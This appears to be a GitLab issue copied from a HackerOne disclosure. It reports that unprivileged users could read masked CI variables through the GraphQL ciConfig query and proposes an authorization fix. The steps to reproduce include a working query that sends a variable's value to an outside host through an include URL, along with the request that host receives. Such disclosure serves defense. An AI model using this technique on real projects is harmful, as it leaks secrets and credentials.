# Backend: Unallowed users can read masked CI variables of Gitlab projects

**[HackerOne report #1511133](https://hackerone.com/reports/1511133)** by `shells3c` on 2022-03-14, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

External users/users without privilege/guests (depends on project visibility) can access CI variables of a Gitlab project using GraphQL. The table below explains all situations that a user can access CI variables:

| Project visibility | Public Project | Internal Project | Private Project |
| --- | --- | --- | --- |
| External user | Yes | No | No |
| User | Yes | Yes | No |
| Guest | Yes | Yes | Yes |

##### Steps to reproduce

1. Create a project, then create a masked CI variable in the project name `PASSWORD`, disable **Protect variable** and enable **Mask variable**
2. From another account (no role in the project), run the following query in the GraphQL Explorer

```
{
  ciConfig(
    projectPath: "dcouture/public_project"
    content: "include: https://[redacted]/$VARIABLE_NAME.yaml"
  ) {
    errors
  }
}
```

3. The server at `example.com` will receive the following request

```
GET /[YOUR PASSWORD HERE].yaml HTTP/1.0
Host: [redacted]
Connection: close
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
```

##### What is the current *bug* behavior?

GraphQL operation `getCiConfigData` loads all CI variables of the project including custom ones in the background

##### What is the expected *correct* behavior?

GraphQL operation `getCiConfigData` shouldn't be able to access project's custom variables

##### Output of checks

This bug happens on GitLab.com

#### Impact

Accessing CI variables, including sensitive masked variables of Gitlab projects without permission

## Proposal

Update `Resolvers::Ci::ConfigResolver` to authorize using the `create_pipeline` policy.
